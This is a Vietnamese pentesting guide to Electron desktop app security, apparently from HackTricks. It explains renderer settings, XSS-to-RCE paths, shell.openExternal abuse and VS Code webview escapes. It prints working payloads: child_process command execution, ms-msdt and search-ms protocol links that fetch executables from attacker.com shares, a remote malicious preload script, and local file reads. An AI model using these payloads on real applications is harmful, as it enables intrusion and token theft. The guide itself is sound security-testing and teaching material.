# Ứng dụng Electron trên máy tính

{{#include ../../banners/hacktricks-training.md}}

## Giới thiệu

Electron kết hợp một tiến trình main **Node.js** có đặc quyền với các tiến trình renderer **Chromium**. Electron không phải là trình duyệt web: mã ứng dụng có thể chủ động cung cấp các khả năng như truy cập filesystem và shell, vì vậy việc tải nội dung không đáng tin cậy đòi hỏi thiết kế ranh giới nghiêm ngặt hơn so với một trang web thông thường.<sup>[[21]](#references)</sup>

Mã ứng dụng Electron thường được đóng gói trong một kho lưu trữ `.asar`. Hãy giải nén kho lưu trữ này trước khi xem xét mã nguồn:

```bash
npx asar extract app.asar destfolder #Extract everything
npx asar extract-file app.asar main.js #Extract just a file
```

`package.json` của ứng dụng xác định điểm vào chính. Tệp đó thường tạo các cửa sổ renderer và thiết lập `webPreferences` nhạy cảm về bảo mật.

```json
{
  "name": "standard-notes",
  "main": "./app/index.js",
```

Electron có hai loại tiến trình chính:

- Main Process (có toàn quyền truy cập vào NodeJS)
- Renderer Process (nên bị hạn chế quyền truy cập NodeJS vì lý do bảo mật)

![Ứng dụng Electron trên máy tính - Giới thiệu: Renderer Process (nên bị hạn chế quyền truy cập NodeJS vì lý do bảo mật)](<../../images/image (182).png>)

Một **renderer process** là một cửa sổ trình duyệt tải một tệp:<sup>[[3]](#references)</sup>

```javascript
const { BrowserWindow } = require("electron")
let win = new BrowserWindow()

//Open Renderer Process
win.loadURL(`file://path/to/index.html`)
```

**main process** cấu hình từng renderer process, thường là khi tạo `BrowserWindow`. Các thiết lập bảo mật giảm khả năng việc xâm nhập renderer process dẫn đến thực thi native code, nhưng không khiến nội dung không đáng tin cậy tự nhiên trở nên an toàn.<sup>[[21]](#references)[[22]](#references)</sup>

Hãy kiểm tra ít nhất các tùy chọn renderer sau:<sup>[[22]](#references)</sup>

- **`nodeIntegration`** mặc định là `false`. Bật tùy chọn này sẽ cho phép JavaScript trong renderer truy cập các API của Node.js, đồng thời vô hiệu hóa sandbox của renderer đó.
- **`contextIsolation`** mặc định là `true`. Tùy chọn này tách biệt ngữ cảnh JavaScript của trang khỏi ngữ cảnh được preload scripts và các thành phần nội bộ của Electron sử dụng.
- **`preload`** không có đường dẫn mặc định. Preload script được cấu hình sẽ chạy trước các script của trang và có thể cung cấp các API với phạm vi giới hạn thông qua `contextBridge`.
- **`sandbox`** mặc định là `true` kể từ Electron 20. Tùy chọn này giới hạn quyền truy cập của renderer vào tài nguyên hệ điều hành; đặt `nodeIntegration: true` sẽ vô hiệu hóa nó.
- **`nodeIntegrationInWorker`** mặc định là `false` và kiểm soát việc tích hợp Node.js trong Web Workers.
- **`nodeIntegrationInSubFrames`** mặc định là `false`.
  - Nếu **`nodeIntegration`** được **bật**, điều này cho phép sử dụng **các API của Node.js** trong những trang web được **tải trong iframe** bên trong ứng dụng Electron.
  - Nếu **`nodeIntegration`** bị **tắt**, thì preload sẽ được tải trong iframe

Ví dụ cấu hình:

```javascript
const mainWindowOptions = {
  title: "Discord",
  backgroundColor: getBackgroundColor(),
  width: DEFAULT_WIDTH,
  height: DEFAULT_HEIGHT,
  minWidth: MIN_WIDTH,
  minHeight: MIN_HEIGHT,
  transparent: false,
  frame: false,
  resizable: true,
  show: isVisible,
  webPreferences: {
    blinkFeatures: "EnumerateDevices,AudioOutputDevices",
    nodeIntegration: false,
    contextIsolation: false,
    sandbox: false,
    nodeIntegrationInSubFrames: false,
    preload: _path2.default.join(__dirname, "mainScreenPreload.js"),
    nativeWindowOpen: true,
    enableRemoteModule: false,
    spellcheck: true,
  },
}
```

Một số **RCE payloads** từ [đây](https://7as.es/electron/nodeIntegration_rce.txt):<sup>[[7]](#references)</sup>

```html
Example Payloads (Windows):
<img
  src="x"
  onerror="alert(require('child_process').execSync('calc').toString());" />

Example Payloads (Linux & MacOS):
<img
  src="x"
  onerror="alert(require('child_process').execSync('gnome-calculator').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('id').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('ls -l').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('uname -a').toString());" />
```

### Thu thập lưu lượng

Sửa đổi cấu hình start-main và thêm việc sử dụng một proxy, chẳng hạn như:

```javascript
"start-main": "electron ./dist/main/main.js --proxy-server=127.0.0.1:8080 --ignore-certificateerrors",
```

## Truy vết tĩnh ranh giới ASAR-to-native bằng REA

**REA** có thể đọc ASAR hoặc thư mục ứng dụng đã giải nén mà không thực thi JavaScript bootstrap. Đồ thị ứng dụng ghi nhận các điểm vào của package, module được bundle, thiết lập `BrowserWindow` và preload, các thành viên `contextBridge`, đăng ký IPC, yêu cầu add-on native và danh tính source map. Đây là điểm khởi đầu để truy vết một khả năng được renderer phơi bày đến một trình xử lý có đặc quyền trong main process.<sup>[[23]](#references)[[24]](#references)</sup>

```bash
rea analyze-javascript-application /absolute/path/to/app.asar --json > application-evidence.json
```

Đối với chuỗi feature literal, hãy truyền toàn bộ bản ghi Evidence dưới dạng `application` và thay seed bằng một giá trị quan sát được trong mục tiêu:<sup>[[25]](#references)</sup>

```bash
node --input-type=module -e '
import { readFileSync, writeFileSync } from "node:fs";
const application = JSON.parse(readFileSync("application-evidence.json", "utf8"));
writeFileSync("trace-input.json", JSON.stringify({
  application, seed: { kind: "string", value: "search-result" }, direction: "both"
}));'
rea trace-application-feature ./trace-input.json --json
```

Quy trình `trace_application_feature` cũng chấp nhận một API member, IPC channel hoặc module literal đã quan sát được làm seed. Kiểm tra đường đi của handler, các ứng viên validation và bước chuyển sang native dựa trên các vị trí source được trả về. Một `invoke` từ renderer chỉ khớp với duy nhất một ứng viên `ipcMain.handle`/`handleOnce` trên cùng một channel literal chính xác; tương tự, `send` cần khớp với duy nhất một ứng viên `ipcMain.on`/`once`/`addListener`. Handler động hoặc trùng lặp vẫn chưa được xác định. Một member `.node` được yêu cầu không phải là native export đã được xác minh; bằng chứng Hopper/Ghidra khớp phải có cùng artifact digest trước khi đưa ra kết luận đó. Khả năng truy cập tĩnh cũng không chứng minh rằng đường đi này đã được thực thi.<sup>[[24]](#references)[[25]](#references)</sup>

Để tìm hiểu ranh giới tin cậy renderer-to-main và validation của handler, xem [RCE Electron contextIsolation qua IPC](electron-contextisolation-rce-via-ipc.md).

Để tiếp tục kiểm tra native gắn với provider, xem [Công cụ reversing & các phương pháp cơ bản](../../reversing/reversing-tools-basic-methods/#evidence-backed-native-investigation-with-rea).

## Bề mặt tấn công auto-update của Electron

Để tìm hiểu tính toàn vẹn của release feed, rollback, nhầm lẫn signed-channel và TOCTOU của staging file, xem [Ranh giới tin cậy của Electron auto-update](electron-auto-update-trust-boundaries.md).

## Electron Local Code Injection

Khi có quyền ghi cục bộ hoặc instrumentation vào ứng dụng đã cài đặt, xem [Electron local code injection và giả mạo snapshot](electron-local-code-injection-and-snapshot-tampering.md) để tìm hiểu các đường tấn công ASAR/main-process và V8 snapshot, cùng các liên kết dành riêng cho từng hệ điều hành.

## RCE: XSS + nodeIntegration

Nếu **nodeIntegration** được đặt thành **on**, JavaScript của trang web có thể dễ dàng sử dụng các tính năng của Node.js chỉ bằng cách gọi `require()`. Ví dụ, cách thực thi ứng dụng calc trên Windows là:

```html
<script>
  require("child_process").exec("calc")
  // or
  top.require("child_process").exec("open /System/Applications/Calculator.app")
</script>
```

<figure><img src="../../images/image (1110).png" alt=""><figcaption></figcaption></figure>

## RCE: preload

Script được chỉ định trong cài đặt này **được tải trước các script khác trong renderer**, vì vậy nó có **quyền truy cập không giới hạn vào Node APIs**:

```javascript
new BrowserWindow{
  webPreferences: {
    nodeIntegration: false,
    preload: _path2.default.join(__dirname, 'perload.js'),
  }
});
```

Do đó, script có thể xuất node-features thành các trang:

```javascript:preload.js
typeof require === "function"
window.runCalc = function () {
  require("child_process").exec("calc")
}
```

```html:index.html
<body>
  <script>
    typeof require === "undefined"
    runCalc()
  </script>
</body>
```

> [!NOTE] > **Nếu `contextIsolation` được bật, cách này sẽ không hoạt động**

## RCE: XSS + contextIsolation

_**contextIsolation**_ tạo ra **các context riêng biệt giữa script của trang web và mã JavaScript nội bộ của Electron**, để việc thực thi JavaScript của mỗi bên không ảnh hưởng đến bên còn lại. Đây là một tính năng cần thiết để loại bỏ khả năng xảy ra RCE.

Nếu các context không được cô lập, kẻ tấn công có thể:

1. Thực thi **JavaScript tùy ý trong renderer** (XSS hoặc điều hướng đến các trang bên ngoài)
2. **Ghi đè phương thức dựng sẵn** được sử dụng trong preload hoặc mã nội bộ của Electron bằng hàm của mình
3. **Kích hoạt** việc sử dụng **hàm đã bị ghi đè**
4. RCE?

Có 2 nơi mà các phương thức dựng sẵn có thể bị ghi đè: trong mã preload hoặc trong mã nội bộ của Electron:


{{#ref}}
electron-contextisolation-rce-via-preload-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-electron-internal-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-ipc.md
{{#endref}}

### Bypass sự kiện click

Nếu có các hạn chế được áp dụng khi bạn nhấp vào một liên kết, bạn có thể bypass chúng bằng cách **nhấp chuột giữa** thay vì nhấp chuột trái thông thường

```javascript
window.addEventListener('click', (e) => {
```

## RCE via shell.openExternal

Để biết thêm thông tin về các ví dụ này, hãy xem [https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8) và [https://benjamin-altpeter.de/shell-openexternal-dangers/](https://benjamin-altpeter.de/shell-openexternal-dangers/)<sup>[[8]](#references)[[9]](#references)</sup>

Khi triển khai ứng dụng desktop Electron, việc đảm bảo thiết lập đúng cho `nodeIntegration` và `contextIsolation` là rất quan trọng. Các thiết lập này giúp ngăn chặn hiệu quả **thực thi mã từ xa (RCE) phía client** nhắm vào preload scripts hoặc mã native của Electron từ main process.

Khi người dùng tương tác với các liên kết hoặc mở cửa sổ mới, các event listener cụ thể sẽ được kích hoạt. Chúng đóng vai trò thiết yếu đối với tính bảo mật và chức năng của ứng dụng:

```javascript
webContents.on("new-window", function (event, url, disposition, options) {}
webContents.on("will-navigate", function (event, url) {}
```

Các listener này được **ứng dụng desktop ghi đè** để triển khai **business logic** riêng. Ứng dụng đánh giá xem liên kết được điều hướng đến nên mở bên trong ứng dụng hay trong trình duyệt web bên ngoài. Quyết định này thường được đưa ra thông qua hàm `openInternally`. Nếu hàm này trả về `false`, điều đó có nghĩa là liên kết nên được mở bên ngoài bằng hàm `shell.openExternal`.

**Sau đây là pseudocode đơn giản hóa:**

![https://miro.medium.com/max/1400/1*iqX26DMEr9RF7nMC1ANMAA.png](<../../images/image (261).png>)

![https://miro.medium.com/max/1400/1*ZfgVwT3X1V_UfjcKaAccag.png](<../../images/image (963).png>)

Các best practice về bảo mật Electron JS khuyến cáo không chấp nhận nội dung không đáng tin cậy bằng hàm `openExternal`, vì điều này có thể dẫn đến RCE thông qua nhiều protocol khác nhau. Hệ điều hành hỗ trợ nhiều protocol có thể kích hoạt RCE. Để xem ví dụ chi tiết và giải thích thêm về chủ đề này, bạn có thể tham khảo [tài liệu này](https://positive.security/blog/url-open-rce#windows-10-19042), trong đó có các ví dụ về protocol trên Windows có thể khai thác lỗ hổng này.<sup>[[10]](#references)</sup>

Trên macOS, có thể khai thác hàm `openExternal` để thực thi các lệnh tùy ý, chẳng hạn như `shell.openExternal('file:///System/Applications/Calculator.app')`.

**Ví dụ về các khai thác protocol trên Windows bao gồm:**

```html
<script>
  window.open(
    "ms-msdt:id%20PCWDiagnostic%20%2Fmoreoptions%20false%20%2Fskip%20true%20%2Fparam%20IT_BrowseForFile%3D%22%5Cattacker.comsmb_sharemalicious_executable.exe%22%20%2Fparam%20IT_SelectProgram%3D%22NotListed%22%20%2Fparam%20IT_AutoTroubleshoot%3D%22ts_AUTO%22"
  )
</script>

<script>
  window.open(
    "search-ms:query=malicious_executable.exe&crumb=location:%5C%5Cattacker.com%5Csmb_share%5Ctools&displayname=Important%20update"
  )
</script>

<script>
  window.open(
    "ms-officecmd:%7B%22id%22:3,%22LocalProviders.LaunchOfficeAppForResult%22:%7B%22details%22:%7B%22appId%22:5,%22name%22:%22Teams%22,%22discovered%22:%7B%22command%22:%22teams.exe%22,%22uri%22:%22msteams%22%7D%7D,%22filename%22:%22a:/b/%2520--disable-gpu-sandbox%2520--gpu-launcher=%22C:%5CWindows%5CSystem32%5Ccmd%2520/c%2520ping%252016843009%2520&&%2520%22%22%7D%7D"
  )
</script>
```

## RCE: webviewTag + vulnerable preload IPC + shell.openExternal

Lỗ hổng này được đề cập trong **[báo cáo này](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)**.<sup>[[11]](#references)</sup>

**webviewTag** là một **tính năng đã lỗi thời** cho phép sử dụng **NodeJS** trong **renderer process**. Tính năng này nên được tắt vì cho phép tải một script bên trong preload context như sau:

```xml
<webview src="https://example.com/" preload="file://malicious.example/test.js"></webview>
```

Do đó, kẻ tấn công có thể lợi dụng tag đó để **tải một preload script tùy ý** nếu tải được một trang bất kỳ.

Sau đó, preload script này được lợi dụng để gọi một **dịch vụ IPC dễ bị tấn công (`skype-new-window`)**, dịch vụ này gọi `shell.openExternal` để đạt được RCE:

```javascript
(async() => {
    const { ipcRenderer } = require("electron");
    await ipcRenderer.invoke("skype-new-window", "https://example.com/EXECUTABLE_PATH");
    setTimeout(async () => {
        const username = process.execPath.match(/C:\\Users\\([^\\]+)/);
        await ipcRenderer.invoke("skype-new-window", `file:///C:/Users/${username[1]}/Downloads/EXECUTABLE_NAME`);
    }, 5000);
})();
```

## Đọc tệp nội bộ: XSS + contextIsolation

**Tắt `contextIsolation` cho phép sử dụng thẻ `<webview>`**, tương tự `<iframe>`, để đọc và exfiltrate các tệp cục bộ. Ví dụ được cung cấp minh họa cách khai thác lỗ hổng này để đọc nội dung của các tệp nội bộ:<sup>[[2]](#references)</sup>

![RCE: webviewTag + vulnerable preload IPC + shell.openExternal - Đọc tệp nội bộ: XSS + contextIsolation: Tắt contextIsolation cho phép sử dụng thẻ , tương tự , để...](<../../images/1 u1jdRYuWAEVwJmf_F2ttJg (1).png>)

Ngoài ra, một phương pháp khác để **đọc tệp nội bộ** cũng được chia sẻ, nêu bật một lỗ hổng đọc tệp cục bộ nghiêm trọng trong ứng dụng desktop Electron. Phương pháp này bao gồm việc chèn một script để khai thác ứng dụng và exfiltrate dữ liệu:

```html
<br /><br /><br /><br />
<h1>
  pwn<br />
  <iframe onload="j()" src="/etc/hosts">xssxsxxsxs</iframe>
  <script type="text/javascript">
    function j() {
      alert(
        "pwned contents of /etc/hosts :\n\n " +
          frames[0].document.body.innerText
      )
    }
  </script>
</h1>
```

## **RCE: XSS + Chromium cũ**

Nếu phiên bản **Chromium** đi kèm ứng dụng đã cũ và có các lỗ hổng đã biết, có thể khai thác nó để biến XSS thành RCE.<sup>[[20]](#references)</sup>\
Bạn có thể xem ví dụ trong **writeup** này: [https://blog.electrovolt.io/posts/discord-rce/](https://blog.electrovolt.io/posts/discord-rce/)<sup>[[12]](#references)</sup>

## **Phishing qua XSS bằng cách bypass regex URL nội bộ**

Nếu bạn tìm thấy XSS nhưng **không thể kích hoạt RCE hoặc đánh cắp các tệp nội bộ**, bạn vẫn có thể thử **đánh cắp thông tin đăng nhập bằng phishing**.<sup>[[1]](#references)</sup>

Trước tiên, hãy kiểm tra mã frontend để xác định điều gì xảy ra khi mở một URL mới:

```javascript
webContents.on("new-window", function (event, url, disposition, options) {} // opens the custom openInternally function (it is declared below)
webContents.on("will-navigate", function (event, url) {}                    // opens the custom openInternally function (it is declared below)
```

Lệnh gọi **`openInternally`** quyết định liệu một liên kết nền tảng sẽ mở trong **cửa sổ desktop** hay một tài nguyên bên thứ ba sẽ mở trong trình duyệt hệ thống.

Nếu có thể bypass regex allowlist URL của hàm—ví dụ vì dấu chấm trong hostname không được escape—kẻ tấn công có thể lợi dụng XSS để mở một lời nhắc thông tin đăng nhập trông có vẻ đáng tin cậy trên hạ tầng do chúng kiểm soát:

```html
<script>
  window.open("<http://subdomainagoogleq.com/index.html>")
</script>
```

## Giao thức `file://`

Như đã đề cập trong [hướng dẫn bảo mật Electron](https://www.electronjs.org/docs/latest/tutorial/security#18-avoid-usage-of-the-file-protocol-and-prefer-usage-of-custom-protocols), các trang chạy trên **`file://`** được cấp quyền truy cập rộng vào tệp. Do đó, **XSS có thể được dùng để tải các tệp tùy ý** từ máy của người dùng. Một **custom protocol** được thiết kế đúng cách có thể giới hạn quyền truy cập vào một tập hợp tệp cụ thể.<sup>[[21]](#references)</sup>

Để biết về một cách bypass phạm vi tệp riêng biệt trong ngữ cảnh worker ở các bản xem trước của trợ lý desktop, xem [Ranh giới tin cậy của trình duyệt nhúng trong trợ lý AI](../../AI/AI-Embedded-Browser-Trust-Boundaries.md#worker-context-bypass-of-a-local-previews-file-scope).

## Remote module

Electron Remote module cho phép **renderer process truy cập các API của main process**, giúp việc giao tiếp trong ứng dụng Electron trở nên thuận tiện. Tuy nhiên, việc bật module này tiềm ẩn các rủi ro bảo mật đáng kể. Nó mở rộng bề mặt tấn công của ứng dụng, khiến ứng dụng dễ bị tổn thương hơn trước các lỗ hổng như tấn công cross-site scripting (XSS).

> [!TIP]
> Mặc dù module **remote** cung cấp một số API từ main process cho renderer process, chỉ lạm dụng các thành phần này thường không dễ dẫn đến RCE. Tuy nhiên, các thành phần đó có thể làm lộ thông tin nhạy cảm.

> [!WARNING]
> Nhiều ứng dụng vẫn dùng remote module theo cách **đòi hỏi phải bật NodeIntegration** trong renderer process, đây là **một rủi ro bảo mật rất lớn**.

Module `remote` tích hợp sẵn của Electron đã bị deprecated rồi bị loại bỏ; các ứng dụng vẫn cần mô hình này có thể dùng package riêng `@electron/remote`. Do những hệ quả về bảo mật và hiệu năng, hãy tránh cung cấp các khả năng kiểu remote cho renderer không đáng tin cậy.

Với `@electron/remote`, trước tiên cần **khởi tạo module trong main process**:

```javascript
const remoteMain = require('@electron/remote/main')
remoteMain.initialize()
[...]
function createMainWindow() {
  mainWindow = new BrowserWindow({
  [...]
  })
  remoteMain.enable(mainWindow.webContents)
```

Sau đó, tiến trình renderer có thể import các đối tượng từ module:

```javascript
import { dialog, getCurrentWindow } from '@electron/remote'
```

**[Bài viết trên blog](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)** nêu một số **function** thú vị được expose bởi object **`app`** từ remote module:<sup>[[6]](#references)</sup>

- **`app.relaunch([options])`**  
   - **Khởi động lại** ứng dụng bằng cách **thoát** khỏi instance hiện tại và **khởi chạy** instance mới. Hữu ích khi **cập nhật app** hoặc có **thay đổi trạng thái** đáng kể.
- **`app.setAppLogsPath([path])`**  
   - **Xác định** hoặc **tạo** thư mục lưu **log của app**. Có thể **truy xuất** hoặc **thay đổi** log bằng **`app.getPath()`** hoặc **`app.setPath(pathName, newPath)`**.
- **`app.setAsDefaultProtocolClient(protocol[, path, args])`**  
   - **Đăng ký** executable hiện tại làm **handler mặc định** cho một **protocol** cụ thể. Có thể cung cấp **path tùy chỉnh** và **argument** nếu cần.
- **`app.setUserTasks(tasks)`**  
   - **Thêm** task vào **danh mục Tasks** trong **Jump List** (trên Windows). Mỗi task có thể kiểm soát cách app được **khởi chạy** hoặc những **argument** được truyền vào.
- **`app.importCertificate(options, callback)`**  
   - **Import** **certificate PKCS#12** vào **certificate store** của hệ thống (chỉ Linux). Có thể dùng **callback** để xử lý kết quả.
- **`app.moveToApplicationsFolder([options])`**  
   - **Di chuyển** ứng dụng vào **thư mục Applications** (trên macOS). Giúp đảm bảo **cài đặt theo chuẩn** cho người dùng Mac.
- **`app.setJumpList(categories)`**  
   - **Thiết lập** hoặc **xóa** **Jump List tùy chỉnh** trên **Windows**. Có thể chỉ định **category** để sắp xếp cách task hiển thị với người dùng.
- **`app.setLoginItemSettings(settings)`**  
   - **Cấu hình** những **executable** sẽ khởi chạy khi **đăng nhập** cùng với các **option** của chúng (chỉ macOS và Windows).
  
Ví dụ:

```javascript
Native.app.relaunch({args: [], execPath: "/System/Applications/Calculator.app/Contents/MacOS/Calculator"});
Native.app.exit()
```

## systemPreferences module

**API chính** để truy cập các tùy chọn hệ thống và **phát ra sự kiện hệ thống** trong Electron. Các phương thức như **subscribeNotification**, **subscribeWorkspaceNotification**, **getUserDefault** và **setUserDefault** đều **thuộc về** module này.

**Ví dụ sử dụng:**

```javascript
const { systemPreferences } = require('electron');

// Subscribe to a specific notification
systemPreferences.subscribeNotification('MyCustomNotification', (event, userInfo) => {
  console.log('Received custom notification:', userInfo);
});

// Get a user default key from macOS
const recentPlaces = systemPreferences.getUserDefault('NSNavRecentPlaces', 'array');
console.log('Recent Places:', recentPlaces);
```

### **subscribeNotification / subscribeWorkspaceNotification**

* **Lắng nghe** **thông báo macOS native** bằng NSDistributedNotificationCenter.  
* Trước **macOS Catalina**, bạn có thể dò tìm **tất cả** thông báo phân tán bằng cách truyền **nil** cho CFNotificationCenterAddObserver.  
* Sau **Catalina / Big Sur**, các ứng dụng sandboxed vẫn có thể **đăng ký nhận** **nhiều sự kiện** (ví dụ: **khóa/mở khóa màn hình**, **gắn volume**, **hoạt động mạng**, v.v.) bằng cách đăng ký thông báo **theo tên**.

### **getUserDefault / setUserDefault**

* **Tương tác** với **NSUserDefaults**, nơi lưu trữ tùy chọn **ứng dụng** hoặc **toàn cục** trên macOS.
    
* **getUserDefault** có thể **truy xuất** thông tin nhạy cảm, chẳng hạn như **vị trí tệp gần đây** hoặc **vị trí địa lý của người dùng**.
    
* **setUserDefault** có thể **sửa đổi** các tùy chọn này, có khả năng ảnh hưởng đến **cấu hình** của ứng dụng.
    
* Trong các **phiên bản Electron cũ hơn** (trước v8.3.0), chỉ **bộ chuẩn** của NSUserDefaults là **có thể truy cập**.

## Shell.showItemInFolder

Hàm này hiển thị tệp được chỉ định trong trình quản lý tệp. Trên các nền tảng và phiên bản bị ảnh hưởng, thao tác này **có thể tự động thực thi tệp**.

Để biết thêm thông tin, xem [https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)<sup>[[6]](#references)</sup>

## Content Security Policy

Các ứng dụng Electron nên có **Content Security Policy (CSP)** để **ngăn chặn các cuộc tấn công XSS**. **CSP** là một **tiêu chuẩn bảo mật** giúp **ngăn chặn** việc **thực thi** **mã không đáng tin cậy** trong trình duyệt.

CSP thường được **cấu hình** trong tệp **`main.js`** hoặc trong mẫu **`index.html`**, với CSP nằm bên trong **thẻ meta**.

Để biết thêm thông tin, xem:


{{#ref}}
../../pentesting-web/content-security-policy-csp-bypass/README.md
{{#endref}}


## RCE: CSP của Webview + độ tin cậy của postMessage + tải tệp cục bộ (VS Code 1.63)

Chuỗi khai thác thực tế này ảnh hưởng đến Visual Studio Code 1.63 (CVE-2021-43908) và cho thấy một XSS bắt nguồn từ markdown trong webview có thể được nâng cấp thành RCE toàn phần khi CSP, postMessage và các trình xử lý scheme bị cấu hình sai. PoC công khai: https://github.com/Sudistark/vscode-rce-electrovolt<sup>[[13]](#references)</sup>

Tổng quan chuỗi tấn công
- XSS đầu tiên thông qua CSP của webview: CSP được tạo ra bao gồm `style-src 'self' 'unsafe-inline'`, cho phép injection dựa trên inline/style trong ngữ cảnh `vscode-webview://`. Payload gửi tín hiệu đến `/stealID` để lấy cắp extensionId của webview mục tiêu.
- Tạo URL webview mục tiêu: Dùng ID bị leak để tạo `vscode-webview://<extensionId>/.../<publicUrl>`.
- XSS thứ hai thông qua độ tin cậy của postMessage: Webview bên ngoài tin cậy `window.postMessage` mà không kiểm tra origin/type chặt chẽ và tải HTML của kẻ tấn công với `allowScripts: true`.
- Tải tệp cục bộ thông qua viết lại scheme/path: Payload viết lại `file:///...` thành `vscode-file://vscode-app/...` và thay `exploit.md` bằng `RCE.html`, lợi dụng việc xác thực path yếu để tải một tài nguyên cục bộ có đặc quyền.
- RCE trong ngữ cảnh bật Node: HTML được tải thực thi khi các Node API khả dụng, cho phép thực thi lệnh trên hệ điều hành.

Ví dụ về primitive RCE trong ngữ cảnh cuối cùng
```js
// RCE.html (executed in a Node-enabled webview context)
require('child_process').exec('calc.exe');            // Windows
require('child_process').exec('/System/Applications/Calculator.app'); // macOS
```

Nội dung đọc thêm về các vấn đề tin cậy của postMessage:

{{#ref}}
../../pentesting-web/postmessage-vulnerabilities/README.md
{{#endref}}

## VS Code / github.dev: phím tắt webview giả lập + cầu nối lệnh extension khai báo

Một loại thoát khỏi webview VS Code khác xuất hiện vào tháng 6 năm 2026: **JavaScript không đáng tin cậy bên trong webview notebook/preview có thể giả lập các phím tắt toàn cục đặc quyền** vì preload của webview chuyển tiếp dữ liệu `keydown` đến workbench của host, và host xử lý dữ liệu đó như đầu vào thực của người dùng.<sup>[[14]](#references)</sup>

Đây là một phần trong lịch sử rộng hơn của các cuộc tấn công vượt ranh giới tin cậy trong IDE, khi nội dung do project kiểm soát tiếp cận các tính năng editor đặc quyền.<sup>[[19]](#references)</sup>

### Lỗi ranh giới

Nếu webview cross-origin/sandboxed sao chép các trường bàn phím do attacker kiểm soát (`key`, `code`, `keyCode`, modifiers, `repeat`) vào một cầu nối đặc quyền `postMessage`/message-port **mà không kiểm tra `event.isTrusted`**, JavaScript bên trong webview có thể thực thi các phím tắt của workbench với:<sup>[[14]](#references)[[15]](#references)</sup>

```javascript
window.dispatchEvent(
  new KeyboardEvent("keydown", {
    key: "a",
    code: "KeyA",
    keyCode: 65,
    ctrlKey: true,
    shiftKey: true,
  })
)
```

Điều này đặc biệt hữu ích khi trình duyệt **chặn thao tác gõ bằng synthetic typing**. Các sự kiện phím được tạo bằng script thường **không thể nhập văn bản tùy ý vào các phần tử HTML `<input>`**, nhưng vẫn kích hoạt được các phím tắt xử lý trực tiếp `keydown`.

### Các cách lạm dụng thực tế

- **Lạm dụng UI dựa trên phím tắt:** nhắm đến các phím tắt toàn cục như chấp nhận thông báo, điều hướng palette, kích hoạt nút đang được focus hoặc di chuyển trong menu thay vì cố gắng nhập lệnh.
- **Prompt đặc quyền có thể dự đoán từ metadata workspace:** một `.vscode/extensions.json` do repository kiểm soát có thể đề xuất extension của attacker và tạo thông báo cài đặt có thể dự đoán, sau đó chấp nhận thông báo bằng phím tắt như `Ctrl+Shift+A`.
- **Manifest extension khai báo làm cầu nối lệnh:** ngay cả khi CSP chặn mã extension của workspace cục bộ trong web VS Code, các khai báo trong `package.json` vẫn có thể được tải. Một extension cục bộ trong `.vscode/extensions` có thể đăng ký keybinding gọi `runCommands`, sau đó gọi một lệnh nội bộ có đặc quyền như `workbench.extensions.installExtension`.<sup>[[14]](#references)[[18]](#references)</sup>

Ví dụ về manifest:

```json
{
  "contributes": {
    "keybindings": [{
      "key": "ctrl+f1",
      "command": "runCommands",
      "args": {"commands": [{
        "command": "workbench.extensions.installExtension"
      }]}
    }]
  }
}
```

- **Các cờ bảo mật ẩn có thể truy cập thông qua metadata không đáng tin cậy:** nếu lệnh nội bộ chấp nhận các đối số do kẻ tấn công kiểm soát như `{"context":{"skipPublisherTrust":true}}`, metadata khai báo có thể bỏ qua hộp thoại xác nhận độ tin cậy và cài đặt một extension được lưu trữ trên Marketplace/CDN, sau đó thực thi mã của kẻ tấn công.
- **Lạm dụng workspace đáng tin cậy:** nếu workspace từ xa/web tự động được tin cậy, các extension trong workspace cục bộ trở thành cầu nối giá trị cao từ nội dung repository đến các hành động có đặc quyền của trình soạn thảo.
- **Mở rộng phạm vi sau khi bị xâm nhập:** sau khi extension thực thi, hãy kiểm tra những token mà trình soạn thảo cung cấp cho extension. Trong `github.dev`, GitHub token bị đánh cắp có hiệu lực vượt ra ngoài repository đang mở, vì vậy truy vấn `https://api.github.com/user/repos` sẽ liệt kê thêm các repository riêng tư có thể truy cập.

### Ghi chú kiểm tra

- Xem **việc chuyển tiếp đầu vào từ webview đến host** là ranh giới đặc quyền; không bao giờ gửi lại các sự kiện phím bấm/click tổng hợp từ frame không đáng tin cậy đến host.
- Thực thi việc phân quyền **bên trong** các lệnh nhạy cảm. Không chấp nhận ngữ cảnh lệnh do bên gọi cung cấp có thể đặt các cờ nội bộ như `skipPublisherTrust`.
- Đừng cho rằng chặn mã extension cục bộ có thể thực thi là đủ; hãy xem xét cả **các đóng góp khai báo** (`keybindings`, `menus`, `commands`, tác vụ) từ manifest do workspace kiểm soát.
- Các bản sửa lỗi ngày 3 tháng 6 năm 2026 đã thêm `isTrusted` vào các sự kiện được chuyển tiếp, vô hiệu hóa việc chuyển tiếp phím không đáng tin cậy trong webview notebook và ngừng chấp nhận ngữ cảnh lệnh cài đặt do bên gọi cung cấp.<sup>[[16]](#references)[[17]](#references)</sup>

## **Công cụ**

Bộ sưu tập được tuyển chọn **awesome-electronjs-hacking** cung cấp thêm tài liệu nghiên cứu, công cụ và tài nguyên về ứng dụng dễ bị tấn công.<sup>[[5]](#references)</sup>

- [**Electronegativity**](https://github.com/doyensec/electronegativity) là công cụ xác định cấu hình sai và các kiểu triển khai không an toàn trong ứng dụng dựa trên Electron.
- [**Electrolint**](https://github.com/ksdmitrieva/electrolint) là plugin VS Code mã nguồn mở dành cho ứng dụng Electron, sử dụng Electronegativity.
- [**nodejsscan**](https://github.com/ajinabraham/nodejsscan) kiểm tra các thư viện bên thứ ba dễ bị tấn công.
- [**Electro.ng**](https://electro.ng/) là công cụ phân tích bảo mật Electron thương mại.

## Phòng thực hành

